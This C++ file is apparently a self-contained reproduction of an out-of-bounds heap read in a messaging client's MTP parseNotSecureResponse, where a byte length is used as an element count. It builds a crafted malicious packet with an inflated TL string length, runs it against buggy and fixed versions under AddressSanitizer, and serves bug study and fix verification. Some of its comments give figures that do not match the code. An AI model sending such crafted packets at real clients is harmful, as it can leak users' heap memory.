// Self-contained reproduction of the out-of-bounds heap read in
// MTP::details::AbstractConnection::parseNotSecureResponse().
//
// It models the exact logic of the real function plus a minimal TL string
// reader (mirroring tl_basic_types.h string_type::read long-string branch),
// which is what actually walks off the end when parsing a resPQ / DH answer.
//
// The `answerLen` field is a BYTE length on the wire (prepareNotSecurePacket
// writes it as `<< 2`), but the real code passed it to gsl::make_span() as an
// mtpPrime (int32) ELEMENT count, so the span — and the TL `end` pointer the
// callers derive from it — could reach up to 4x past the packet allocation.
//
//   Build & run:
//     c++ -std=c++17 -fsanitize=address -g repro.cpp -o repro && ./repro <mode>
//   where <mode> is `buggy` or `fixed`.

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

using mtpPrime = int32_t;

// --- minimal gsl::span<const mtpPrime> ------------------------------------
struct Span {
    const mtpPrime *ptr = nullptr;
    size_t count = 0; // number of mtpPrime ELEMENTS
    const mtpPrime *data() const { return ptr; }
    size_t size() const { return count; }
    bool empty() const { return count == 0; }
};

// --- minimal TL reader (mirrors Reader<mtpPrime> + string_type::read) ------
struct Reader {
    const mtpPrime *from;
    const mtpPrime *end;
    bool Has(uint32_t primes) const { return size_t(end - from) >= primes; }
    bool HasBytes(uint32_t count) const {
        uint32_t primes = (count / 4) + (count % 4 ? 1 : 0);
        return size_t(end - from) >= primes;
    }
    uint32_t Get() { return uint32_t(*from++); }
    void GetBytes(void *dst, uint32_t count) {
        uint32_t primes = (count / 4) + (count % 4 ? 1 : 0);
        std::memcpy(dst, from, count); // <-- OOB read happens here
        from += primes;
    }
};

// Reads a TL `bytes`/`string`; returns false only on the reader's own bounds
// check. With a falsely-far `end`, the check passes and GetBytes over-reads.
static bool readString(Reader &r, std::string &out) {
    if (!r.Has(1)) return false;
    const uint32_t first = r.Get();
    const uint32_t last = first & 0xFFu;
    if (last < 254) {
        if (last <= 2) { out.assign(last, 'x'); return true; }
        const uint32_t remaining = last - 3;
        if (!r.HasBytes(remaining)) return false;
        out.resize(last);
        r.GetBytes(out.data() + 3, remaining);
        return true;
    }
    const uint32_t length = (first >> 8); // 24-bit, attacker-controlled
    if (!r.HasBytes(length)) return false;
    out.resize(length);
    r.GetBytes(out.data(), length); // reads `length` bytes from `from`
    return true;
}

// --- faithful model of parseNotSecureResponse -----------------------------
static Span parseNotSecureResponse(const std::vector<mtpPrime> &buffer,
                                   bool fixed) {
    const mtpPrime *answer = buffer.data();
    const size_t len = buffer.size();
    if (len < 6) return {};
    if (answer[0] != 0 || answer[1] != 0 || ((uint32_t(answer[2])) & 0x03) != 1)
        return {};
    const uint32_t answerLen = uint32_t(answer[4]); // BYTES on the wire
    if (answerLen < 1 || answerLen > (len - 5) * sizeof(mtpPrime))
        return {};
    if (fixed)
        return { answer + 5, answerLen / sizeof(mtpPrime) }; // prime count (FIX)
    else
        return { answer + 5, answerLen };                    // element==byte (BUG)
}

int main(int argc, char **argv) {
    const bool fixed = (argc > 1 && std::string(argv[1]) == "fixed");

    // Craft a malicious "not secure" answer packet.
    // Layout (primes): [0,1]=auth_key_id(0) [2,3]=msg_id [4]=length [5..]=body
    // Real body is tiny: two int128 nonces would be 8 primes, but we truncate
    // to make the parser rely on the (inflated) end. Here we place a single
    // TL long-string header claiming 4096 bytes of payload right at the edge.
    const uint32_t realBodyPrimes = 100;  // 100 primes of real body present
    std::vector<mtpPrime> buffer(5 + realBodyPrimes);
    buffer[0] = 0;                        // auth_key_id low
    buffer[1] = 0;                        // auth_key_id high
    buffer[2] = 1;                        // msg_id low (& 3 == 1)
    buffer[3] = 0;                        // msg_id high
    // length field: claim the maximum the bounds check allows, in BYTES.
    // = 400 bytes. In the buggy build this becomes a 400-*prime* span, i.e.
    // an `end` pointer 400 primes past the body while only 100 primes exist.
    buffer[4] = mtpPrime(realBodyPrimes * sizeof(mtpPrime)); // = 400 bytes
    // body[0]: TL long-string header -> last byte 254, length payload chosen
    // so ceil(len/4) primes fits within the *false* end (400) but runs well
    // past the *real* 100-prime allocation. len = 399*4 = 1596 bytes.
    buffer[5] = mtpPrime(254u | (1596u << 8));
    // (rest of the real body is left zero-initialized)

    Span answer = parseNotSecureResponse(buffer, fixed);
    printf("[%s] buffer primes=%zu, span size()=%zu primes (end is %zu primes "
           "past body start)\n",
           fixed ? "fixed" : "buggy", buffer.size(), answer.size(),
           answer.size());

    if (answer.empty()) { printf("empty span -> reject (safe)\n"); return 0; }

    Reader r{ answer.data(), answer.data() + answer.size() };
    std::string pq;
    // In the buggy build, end = body+16 primes, but only 4 real primes exist;
    // HasBytes(4096) passes against the far end and GetBytes over-reads.
    const bool ok = readString(r, pq);
    printf("readString -> %s, pq.size()=%zu\n", ok ? "true" : "false", pq.size());
    return 0;
}
